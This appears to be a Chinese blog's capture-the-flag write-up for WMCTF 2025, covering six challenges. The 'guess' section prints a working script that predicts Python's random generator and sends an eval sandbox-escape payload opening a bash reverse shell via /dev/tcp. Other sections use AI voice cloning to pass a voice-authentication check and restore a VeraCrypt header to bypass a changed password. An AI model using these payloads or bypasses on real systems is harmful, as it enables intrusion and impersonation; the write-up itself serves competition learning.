<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>WMCTF 2025 Writeup | w8nn9z Blog</title><meta name=keywords content><meta name=description content="WMCTF 2025 Writeup - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/ctf/wmctf-2025-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/ctf/wmctf-2025-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/ctf/wmctf-2025-writeup/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="WMCTF 2025 Writeup"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-09-20T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-05T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="WMCTF 2025 Writeup"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"CTF","item":"https://blog.w8nn9z.top/posts/ctf/"},{"@type":"ListItem","position":3,"name":"WMCTF 2025 Writeup","item":"https://blog.w8nn9z.top/posts/ctf/wmctf-2025-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"WMCTF 2025 Writeup","name":"WMCTF 2025 Writeup","description":"","keywords":[],"articleBody":"guess app.py：\nfrom flask import Flask, request, jsonify, session, render_template, redirect import random rd = random.Random() def generate_random_string(): return str(rd.getrandbits(32)) app = Flask(__name__) app.secret_key = generate_random_string() users = [] a = generate_random_string() @app.route('/register', methods=['POST', 'GET']) def register(): if request.method == 'GET': return render_template('register.html') data = request.get_json() username = data.get('username') password = data.get('password') if not username or not password: return jsonify({'error': 'Username and password are required'}), 400 if any(user['username'] == username for user in users): return jsonify({'error': 'Username already exists'}), 400 user_id = generate_random_string() users.append({ 'user_id': user_id, 'username': username, 'password': password }) return jsonify({ 'message': 'User registered successfully', 'user_id': user_id }), 201 @app.route('/login', methods=['POST', 'GET']) def login(): if request.method == 'GET': return render_template('login.html') data = request.get_json() username = data.get('username') password = data.get('password') if not username or not password: return jsonify({'error': 'Username and password are required'}), 400 user = next((user for user in users if user['username'] == username and user['password'] == password), None) if not user: return jsonify({'error': 'Invalid credentials'}), 401 session['user_id'] = user['user_id'] session['username'] = user['username'] return jsonify({ 'message': 'Login successful', 'user_id': user['user_id'] }), 200 @app.post('/api') def protected_api(): data = request.get_json() key1 = data.get('key') if not key1: return jsonify({'error': 'key are required'}), 400 key2 = generate_random_string() if not str(key1) == str(key2): return jsonify({ 'message': 'Not Allowed:' + str(key2) , }), 403 payload = data.get('payload') if payload: eval(payload, {'__builtin__':{}}) return jsonify({ 'message': 'Access granted', }) @app.route('/') def index(): if 'user_id' not in session: return redirect('/login') return render_template('index.html') if __name__ == '__main__': app.run(host='0.0.0.0', port=5001) 用random生成随机数使用的是梅森旋转法，攻击脚本：https://github.com/tna0y/Python-random-module-cracker\n本题还删除了builtin的所有内置函数，可以直接通过继承和魔术方法重新获取system\n原脚本里需要624个生成的随机数序列来预测下一个随机数，可以通过创建624个用户的方式来获取，稍微修改一下原脚本就能写出爆破脚本，最后bash反弹shell：\nimport random, time import requests import json from randcrack import RandCrack def random_cracker(): rc = RandCrack() with open(\"output.txt\", \"r\") as f: lines = f.readlines() for line in lines: rc.submit(int(line.replace(\"\\n\",\"\"))) return rc def register(): url = \"http://49.232.42.74:31914/register\" user_id_list = [] for i in range(624): json_data = {\"username\": str(i), \"password\": \"p\"} resp = requests.post(url, json=json_data) user_id = (resp.json())['user_id'] user_id_list.append(user_id) # print(i) return user_id_list def output(user_id_list): with open(\"output.txt\", \"w\") as f: for user_id in user_id_list: f.write(user_id + \"\\n\") def attack(): url = \"http://49.232.42.74:31914/api\" rc = random_cracker() for i in range(300): json_data = {\"key\": rc.predict_randrange(0, 4294967295), \"payload\": f\"''.__class__.__mro__[1].__subclasses__()[{i}].__init__.__globals__['system']('bash -c \\\"bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261\\\"')\"} resp = requests.post(url, json=json_data) # print(i) # print(resp.text) user_id_list = register() output(user_id_list) attack() 参考资料：\nhttps://github.com/Luna5akura/BabyPyjail\nphishing email 一封钓鱼邮件，在svg里嵌入了恶意javascript代码，好像是最近的技术，用\u003c![CDATA[ ... ]]\u003e来包装恶意代码，防止被当作XML解析，同时代码中有反调试以及大量混淆，提取关键的部分：\nvar encryptedParts = [ '4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y', '4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R', '4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J', '4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B', '4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4' ]; var stage1Results = []; for (var j = 0; j \u003c encryptedParts.length; j++) { var part = encryptedParts[j]; // Convert Unicode escape sequences to characters var decoded = part.replace(/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g, function(match) { var charMap = { '4p2V': 'A', '4p2P': 'D', '4p2F': 'E', '4p2g': 'G', '4p2a': 'P', '4p2c': 'S', '4oyI': 'V', '4p2T': 'a', '77iP': 'c', '4p2S': 'c', '4p2L': 'c', '4p2D': 'a', '4p2O': 'e', '4p2M': 'e', '4p2d': 'f', '77iO': 'g', '4p2b': 'h', '4p2Z': 'h', '4oyL': 'i', '77iM': 'i', '4p2J': 'i', '4p2B': 'i', '4p2R': 'k', '4p2h': 'm', '4p2X': 'n', '4p2H': 'n', '4pyx': 'n', '4p2I': 'o', '4p2A': 'o', '4p2C': 's', '4p2Y': 's', '4p2j': 't', '77iK': 't', '4p2U': 't', '4p2K': 't', '4p2N': 't', '4p2E': 'v', '4oyM': 'w', '77iL': '{', '4py9': '}', '77iN': '_', '4p2W': '_', '4p2Q': '_', '4p2G': '_', '4py8': '!', '4py7': '!', '4py6': '!', '4py5': '!', '4py4': '!' }; return charMap[match] || ''; }); stage1Results.push(decoded); } var combined = stage1Results.join(''); console.log('Stage 1 result:', combined); // Stage 1 result: wmctwf{S4oyIG_Pch4oyLshing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{4pyxg4py9i4py8t4py7{4py6i4py5_4py4 可以看到result里仍然有一些映射表中的键名未被映射，修改一下正则再映射一次：\nvar part = \"wmctwf{S4oyIG_Pch4oyLshing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{4pyxg4py9i4py8t4py7{4py6i4py5_4py4\" var decoded = part.replace(/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]|4py[a-zA-Z0-9]|4oy[a-zA-Z0-9]/g, function(match) { var charMap = { '4p2V': 'A', '4p2P': 'D', '4p2F': 'E', '4p2g': 'G', '4p2a': 'P', '4p2c': 'S', '4oyI': 'V', '4p2T': 'a', '77iP': 'c', '4p2S': 'c', '4p2L': 'c', '4p2D': 'a', '4p2O': 'e', '4p2M': 'e', '4p2d': 'f', '77iO': 'g', '4p2b': 'h', '4p2Z': 'h', '4oyL': 'i', '77iM': 'i', '4p2J': 'i', '4p2B': 'i', '4p2R': 'k', '4p2h': 'm', '4p2X': 'n', '4p2H': 'n', '4pyx': 'n', '4p2I': 'o', '4p2A': 'o', '4p2C': 's', '4p2Y': 's', '4p2j': 't', '77iK': 't', '4p2U': 't', '4p2K': 't', '4p2N': 't', '4p2E': 'v', '4oyM': 'w', '77iL': '{', '4py9': '}', '77iN': '_', '4p2W': '_', '4p2Q': '_', '4p2G': '_', '4py8': '!', '4py7': '!', '4py6': '!', '4py5': '!', '4py4': '!' }; return charMap[match] || ''; }); console.log(decoded) // wmctwf{SVG_Pchishing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{ng}i!t!{!i!_! 删掉一些无意义的额外字符就能得到flag：wmctf{SVG_Phishing_Attack_Detection_Evasion}\n参考资料：\nhttps://xz.aliyun.com/news/17777\nVoice_hacker 一段UDP流量，猜测传输了一段音频，解码为RTP，再进行RTP流的分析与保存得到一段wav，里面是一段日常的对话\nweb服务要求录入一段指定内容的音频CTF，启动！来进行认证：\n\u003cscript\u003e let isRecording = false; let mediaRecorder = null; let audioChunks = []; function showStatus(message, type = 'info') { const statusDiv = document.getElementById('status'); statusDiv.textContent = message; statusDiv.className = `status ${type}`; statusDiv.style.display = 'block'; } function showResult(data) { // 隐藏状态条，只展示结果框，避免同时出现两条信息 const statusDiv = document.getElementById('status'); statusDiv.style.display = 'none'; const resultDiv = document.getElementById('result'); resultDiv.style.display = 'block'; if (data.success) { resultDiv.innerHTML = ` ✅ 认证成功！ `; } else { resultDiv.innerHTML = ` ❌ 认证失败 `; } } async function startRecording() { if (isRecording) return; const recordButton = document.getElementById('recordButton'); recordButton.disabled = true; recordButton.textContent = '录音中...'; recordButton.classList.add('recording'); showStatus('正在录音...', 'info'); try { // 模拟录音过程 await simulateRecording(); // 模拟录音完成后自动发送 await submitFakeAudio(); } catch (error) { console.error('录音错误:', error); showStatus('录音失败，请重试', 'error'); resetButton(); } } async function simulateRecording() { // 模拟录音过程，显示倒计时 return new Promise((resolve) =\u003e { let countdown = 3; const interval = setInterval(() =\u003e { if (countdown \u003e 0) { showStatus(`录音中... ${countdown}`, 'info'); countdown--; } else { clearInterval(interval); showStatus('录音完成，正在处理...', 'info'); resolve(); } }, 1000); }); } async function submitFakeAudio() { try { showStatus('正在认证...', 'info'); // 先获取随机生成的音频文件 console.log('获取随机音频文件...'); const audioResponse = await fetch('/api/fake_audio'); if (!audioResponse.ok) { throw new Error('获取音频文件失败'); } const audioBlob = await audioResponse.blob(); console.log('获取到音频文件，大小:', audioBlob.size, 'bytes'); // 确保blob有正确的MIME类型 const audioFile = new File([audioBlob], 'recording.wav', { type: 'audio/wav' }); // 使用获取到的音频文件进行认证 const formData = new FormData(); formData.append('audio', audioFile); console.log('发送认证请求...'); console.log('音频文件类型:', audioFile.type); console.log('音频文件大小:', audioFile.size); const response = await fetch('/api/authenticate', { method: 'POST', body: formData }); if (!response.ok) { throw new Error(`HTTP ${response.status}: ${response.statusText}`); } const data = await response.json(); console.log('认证结果:', data); if (data \u0026\u0026 data.success) { showStatus('认证成功', 'success'); } else { showStatus('认证失败', 'error'); } showResult(data); } catch (error) { console.error('认证错误:', error); showStatus(`认证失败: ${error.message}`, 'error'); } finally { resetButton(); } } function resetButton() { const recordButton = document.getElementById('recordButton'); recordButton.disabled = false; recordButton.textContent = '开始录音'; recordButton.classList.remove('recording'); } \u003c/script\u003e 尝试根据已有录音AI生成一段指定内容的音频，使用在线网站：https://www.minimax.io/audio\n第一次直接生成认证失败了，第二次往里面添加了几秒的原音频片段用于模仿口音，就能生成通过认证的音频，下载下来是个mp3转一下wav再上传就行：\nimport requests url = 'http://49.232.42.74:31999/api/authenticate' audio = 'clone2.wav' with open(audio, 'rb') as f: files = { 'audio': ('recording.wav', f, 'audio/wav') } resp = requests.post(url, files=files) print(resp.text) response：\n{\r\"flag\": \"WMCTF{01a9a4f1-e748-43fa-8d6d-bba372016adc}\",\r\"message\": \"\\u8ba4\\u8bc1\\u6210\\u529f\",\r\"success\": true\r} 参考资料：\nhttps://www.cnblogs.com/dier-gaohe/p/17716972.html\ngithacker 查看操作日志：\ngit reflog\r484c0d3 (HEAD -\u003e master) HEAD@{0}: commit: have a good time!\r93ab7b9 HEAD@{1}: reset: moving to HEAD~1\rd504bbf HEAD@{2}: commit: encryptedFile\r93ab7b9 HEAD@{3}: commit: change password\r6ec92bc HEAD@{4}: reset: moving to HEAD~1\ra026274 HEAD@{5}: commit: password\r6ec92bc HEAD@{6}: commit: encryptedFile\r6b6285c HEAD@{7}: commit (initial): Init 一条一条查详细信息：\ngit show 6b6285c\rcommit 6b6285cc1283144db890f1b27cc8c7b6ccd4b643\rAuthor: toto Date: Sat Aug 9 17:13:39 2025 +0800\rInit\rdiff --git a/README.md b/README.md\rnew file mode 100644\rindex 0000000..43122ff\r--- /dev/null\r+++ b/README.md\r@@ -0,0 +1 @@\r+\"# Welcome to WMCTF 2025\"\rgit show 6ec92bc\rcommit 6ec92bcfdf3044bf21dcfa74500cbb929c0f0037\rAuthor: toto Date: Sat Aug 9 17:14:06 2025 +0800\rencryptedFile\rdiff --git a/image.png b/image.png\rnew file mode 100644\rindex 0000000..27e6acd\rBinary files /dev/null and b/image.png differ\rgit show a026274\rcommit a026274fb418ec88af16444644fccab9b8a7e8dd\rAuthor: toto Date: Sat Aug 9 17:14:40 2025 +0800\rpassword\rdiff --git a/password.md b/password.md\rnew file mode 100644\rindex 0000000..1ab140f\r--- /dev/null\r+++ b/password.md\r@@ -0,0 +1 @@\r+\"EasyP@ssw0rd_from_Git_History\"\rgit show 93ab7b9\rcommit 93ab7b9e28a4d442ec77a3fb37d64912bbddfdad\rAuthor: toto Date: Sat Aug 9 17:19:32 2025 +0800\rchange password\rgit show d504bbf\rcommit d504bbf75693fc83f6cf5c873306b7fc67edd804\rAuthor: toto Date: Sat Aug 9 17:23:51 2025 +0800\rencryptedFile\rdiff --git a/image.jpg b/image.jpg\rnew file mode 100644\rindex 0000000..a3a40e3\rBinary files /dev/null and b/image.jpg differ\rgit show 484c0d3\rcommit 484c0d313c560eb48986ef96690ef2f034addc90 (HEAD -\u003e master)\rAuthor: toto Date: Sat Aug 9 17:25:29 2025 +0800\rhave a good time! 恢复文件：\ngit checkout 6ec92bc -- image.png\rgit checkout a026274 -- password.md\rgit checkout d504bbf -- image.jpg image.png 和 image.jpg 都是VeraCrypt的加密容器，其中image.png能够直接用密码EasyP@ssw0rd_from_Git_History挂载，flag.txt：\nCongratulations! This is half of the gift I gave you:\rWMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_\rDon't forget the way you came!Please keep trying to find the remaining gifts! 后半段flag肯定在image.jpg中了，但是根据历史记录来看是修改过密码的，无法直接用image.png的密码解密\nVeraCrypt是通过主密钥来加解密文件的，而主密钥存在于加密卷头中，加密卷头又由密码进行加解密，因此如果image.jpg主密钥没变只是修改了密码，那么只需要从image.png中备份加密卷头，再用该加密卷头来恢复image.jpg的密码，这样就可以绕过密码未知的问题：\n1.使用image.png备份加密卷头信息，输入image.png容器密码进行验证\r2.使用备份的加密卷头来恢复image.jpg的加密卷头信息\r3.结束后会提示旧密码已恢复，此时已经可以用EasyP@ssw0rd_from_Git_History来挂载image.jpg容器 flag.txt：\nCongratulations! You've solved it!\rFiguring out the volume header manipulation trick is a sign of a true expert.\rYou've earned this. Well played!\rAnd_Y0u_M4ster_The_VeraCrypt_H34der_Trick!} 完整flag：WMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_And_Y0u_M4ster_The_VeraCrypt_H34der_Trick!}\n参考资料：\nhttps://www.reddit.com/r/VeraCrypt/comments/j1gnfx/difference_between_rescue_disk_and_volume_header/?tl=zh-hans\ncatfriend flag硬编码在程序里了，IDA打开搜索字符串就能找到：WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}\nappfriend jadx找到MainActivity：\npublic class MainActivity extends AbstractActivityC0115h { /* renamed from: x, reason: collision with root package name */ public EditText f1494x; static { System.loadLibrary(\"yellow\"); } public MainActivity() { ((e) this.f818e.f832c).e(\"androidx:appcompat\", new C0098a(this)); h(new C0114g(this)); } public native boolean checkflag(String str); @Override // e.AbstractActivityC0115h, androidx.activity.k, x.f, android.app.Activity public final void onCreate(Bundle bundle) { super.onCreate(bundle); View inflate = getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false); int i2 = R.id.button; if (((Button) d.j(inflate, R.id.button)) != null) { if (((EditText) d.j(inflate, R.id.editText)) != null) { if (((TextView) d.j(inflate, R.id.sample_text)) != null) { setContentView((ConstraintLayout) inflate); this.f1494x = (EditText) findViewById(R.id.editText); ((Button) findViewById(R.id.button)).setOnClickListener(new k(2, this)); return; } i2 = R.id.sample_text; } else { i2 = R.id.editText; } } throw new NullPointerException(\"Missing required view with ID: \".concat(inflate.getResources().getResourceName(i2))); } } 从lib中加载了yellow，把libyellow.so拖到IDA里：\n解SM4得到flag：\n","wordCount":"3331","inLanguage":"en","datePublished":"2025-09-20T00:00:00Z","dateModified":"2025-10-05T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/ctf/wmctf-2025-writeup/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">WMCTF 2025 Writeup</h1><div class=post-meta><span title='2025-09-20 00:00:00 +0000 UTC'>September 20, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#guess aria-label=guess>guess</a></li><li><a href=#phishing-email aria-label="phishing email">phishing email</a></li><li><a href=#voice_hacker aria-label=Voice_hacker>Voice_hacker</a></li><li><a href=#githacker aria-label=githacker>githacker</a></li><li><a href=#catfriend aria-label=catfriend>catfriend</a></li><li><a href=#appfriend aria-label=appfriend>appfriend</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=guess>guess<a hidden class=anchor aria-hidden=true href=#guess>#</a></h2><p>app.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, jsonify, session, render_template, redirect
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rd <span style=color:#f92672>=</span> random<span style=color:#f92672>.</span>Random()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_random_string</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> str(rd<span style=color:#f92672>.</span>getrandbits(<span style=color:#ae81ff>32</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> generate_random_string()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>users <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> generate_random_string()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/register&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;GET&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;register.html&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get_json()
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> username <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> password:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;Username and password are required&#39;</span>}), <span style=color:#ae81ff>400</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> any(user[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>==</span> username <span style=color:#66d9ef>for</span> user <span style=color:#f92672>in</span> users):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;Username already exists&#39;</span>}), <span style=color:#ae81ff>400</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    user_id <span style=color:#f92672>=</span> generate_random_string()
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    users<span style=color:#f92672>.</span>append({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;user_id&#39;</span>: user_id,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;username&#39;</span>: username,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;password&#39;</span>: password
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> jsonify({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;message&#39;</span>: <span style=color:#e6db74>&#39;User registered successfully&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;user_id&#39;</span>: user_id
</span></span><span style=display:flex><span>    }), <span style=color:#ae81ff>201</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;GET&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get_json()
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> username <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> password:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;Username and password are required&#39;</span>}), <span style=color:#ae81ff>400</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> next((user <span style=color:#66d9ef>for</span> user <span style=color:#f92672>in</span> users <span style=color:#66d9ef>if</span> user[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>==</span> username <span style=color:#f92672>and</span> user[<span style=color:#e6db74>&#39;password&#39;</span>] <span style=color:#f92672>==</span> password), <span style=color:#66d9ef>None</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;Invalid credentials&#39;</span>}), <span style=color:#ae81ff>401</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    session[<span style=color:#e6db74>&#39;user_id&#39;</span>] <span style=color:#f92672>=</span> user[<span style=color:#e6db74>&#39;user_id&#39;</span>]
</span></span><span style=display:flex><span>    session[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>=</span> user[<span style=color:#e6db74>&#39;username&#39;</span>]
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> jsonify({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;message&#39;</span>: <span style=color:#e6db74>&#39;Login successful&#39;</span>,
